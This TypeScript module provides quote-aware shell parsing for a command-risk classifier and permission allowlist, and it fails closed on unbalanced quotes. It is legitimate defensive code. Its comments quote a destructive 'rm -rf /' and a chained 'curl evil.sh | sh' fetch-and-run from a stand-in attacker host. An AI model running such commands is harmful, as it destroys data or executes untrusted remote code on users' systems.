// Quote-aware shell-syntax primitives (flow 115).
//
// Shared by the command-risk classifier and the permission allowlist. Both need
// to answer "what is actually a command here, and what is merely text inside an
// argument" — `echo 'rm -rf /'` must not read as a destructive command, and
// `git commit -m "fix: a; b"` must not read as two commands.
//
// This is deliberately NOT a shell parser. It tracks single quotes, double
// quotes, and backslash escaping — enough to tell a structural metacharacter
// from a quoted one — and it fails CLOSED on input it cannot analyse
// (unbalanced quotes). Anything beyond that is left to the human gate.
//
// Pure and deterministic: no clock, RNG, filesystem, env, or network.

/** Separators that end one simple command inside a compound command line. */
export type Separator = "|" | ";" | "&&" | "||" | "\n";

/** One simple command inside a compound command line. */
export interface Segment {
  /** Raw text of this simple command (separators excluded). */
  raw: string;
  /** Quote-aware words, with surrounding quotes stripped. */
  words: string[];
  /** The separator that INTRODUCED this segment (undefined for the first). */
  precededBy?: Separator;
}

/**
 * Structural metacharacters: they chain, redirect, background, or substitute —
 * i.e. they let one approved-looking string run something else.
 *
 * `$VAR` is deliberately NOT here: bare variable expansion is too common
 * (`echo $PATH`) and cannot by itself introduce a new command. `$(` and a
 * backtick can, and are.
 */
const METACHARACTERS = new Set([";", "&", "|", "<", ">", "\n", "`"]);

interface ScanState {
  /** True when the scan ended inside an unterminated quote. */
  unbalanced: boolean;
  /** True when any structural metacharacter appeared outside quotes. */
  metacharacter: boolean;
}

/** One step inside an open quote: the new quote state, and whether to skip a char. */
function stepInsideQuote(
  ch: string,
  next: string | undefined,
  quote: '"' | "'",
): { quote: '"' | "'" | undefined; skipNext: boolean } {
  // Only double quotes honour backslash escaping; inside '' everything is literal.
  if (quote === '"' && ch === "\\" && next !== undefined) {
    return { quote, skipNext: true };
  }
  return { quote: ch === quote ? undefined : quote, skipNext: false };
}

/** True when `ch` (with lookahead) is a structural metacharacter outside quotes. */
function isStructural(ch: string, next: string | undefined): boolean {
  if (ch === "$") return next === "(";
  return METACHARACTERS.has(ch);
}

/** Walk `text` tracking quote state; report unquoted metacharacters. */
function scan(text: string): ScanState {
  let quote: '"' | "'" | undefined;
  let metacharacter = false;

  for (let i = 0; i < text.length; i++) {
    const ch = text[i]!;
    const next = text[i + 1];

    if (quote !== undefined) {
      const step = stepInsideQuote(ch, next, quote);
      quote = step.quote;
      if (step.skipNext) i++;
      continue;
    }
    if (ch === "\\" && next !== undefined) {
      i++; // an escaped character is literal, never structural
      continue;
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      continue;
    }
    if (isStructural(ch, next)) {
      metacharacter = true;
    }
  }

  return { unbalanced: quote !== undefined, metacharacter };
}

/**
 * True when `command` contains a shell metacharacter OUTSIDE quotes, or cannot
 * be analysed at all (unbalanced quotes → fail closed).
 *
 * A command for which this is true must never be matched against a saved
 * allowlist pattern and must never be remembered as one: the pattern would be
 * matched against raw text that `/bin/sh -c` then re-interprets, so `git *`
 * would cover `git status; curl evil.sh | sh`.
 */
export function hasUnquotedMetacharacter(command: string): boolean {
  const state = scan(command);
  return state.unbalanced || state.metacharacter;
}

/**
 * Split a command line into simple-command segments, honouring quotes and
 * backslash escapes so a separator inside a quoted argument never splits.
 */
export function splitSegments(command: string): Segment[] {
  const segments: Segment[] = [];
  let buf = "";
  let pending: Separator | undefined;
  let quote: '"' | "'" | undefined;

  const flush = (next?: Separator): void => {
    const raw = buf.trim();
    if (raw.length > 0) {
      segments.push({
        raw,
        words: splitWords(raw),
        ...(pending !== undefined ? { precededBy: pending } : {}),
      });
    }
    buf = "";
    pending = next;
  };

  for (let i = 0; i < command.length; i++) {
    const ch = command[i]!;
    const next = command[i + 1];

    if (quote !== undefined) {
      buf += ch;
      if (quote === '"' && ch === "\\" && next !== undefined) {
        buf += next;
        i++;
        continue;
      }
      if (ch === quote) quote = undefined;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      buf += ch;
      continue;
    }
    if (ch === "\\" && next !== undefined) {
      buf += ch + next;
      i++;
      continue;
    }
    const sep = separatorAt(ch, next);
    if (sep !== undefined) {
      flush(sep.separator);
      i += sep.length - 1;
      continue;
    }
    buf += ch;
  }
  flush();
  return segments;
}

/** The separator starting at this character, if any, and how many chars it spans. */
function separatorAt(
  ch: string,
  next: string | undefined,
): { separator: Separator; length: number } | undefined {
  if (ch === "&" && next === "&") return { separator: "&&", length: 2 };
  if (ch === "|" && next === "|") return { separator: "||", length: 2 };
  if (ch === "|") return { separator: "|", length: 1 };
  if (ch === ";") return { separator: ";", length: 1 };
  if (ch === "\n") return { separator: "\n", length: 1 };
  return undefined;
}

/** Quote-aware word split; surrounding quotes are stripped from each word. */
export function splitWords(text: string): string[] {
  const words: string[] = [];
  let buf = "";
  let quote: '"' | "'" | undefined;
  let started = false;

  const push = (): void => {
    if (started || buf.length > 0) words.push(buf);
    buf = "";
    started = false;
  };

  for (let i = 0; i < text.length; i++) {
    const ch = text[i]!;
    if (quote !== undefined) {
      if (ch === quote) quote = undefined;
      else buf += ch;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      started = true;
      continue;
    }
    if (/\s/.test(ch)) {
      if (buf.length > 0 || started) push();
      continue;
    }
    buf += ch;
  }
  push();
  return words;
}

/** Drop leading `VAR=value` assignments so they cannot hide the command word. */
export function stripAssignments(words: readonly string[]): string[] {
  let i = 0;
  while (i < words.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(words[i]!)) i++;
  return words.slice(i);
}

/** Lowercased basename of the command word: `/usr/bin/rm` → `rm`. */
export function commandWord(words: readonly string[]): string {
  const first = stripAssignments(words)[0] ?? "";
  const base = first.split("/").pop() ?? first;
  return base.toLowerCase();
}
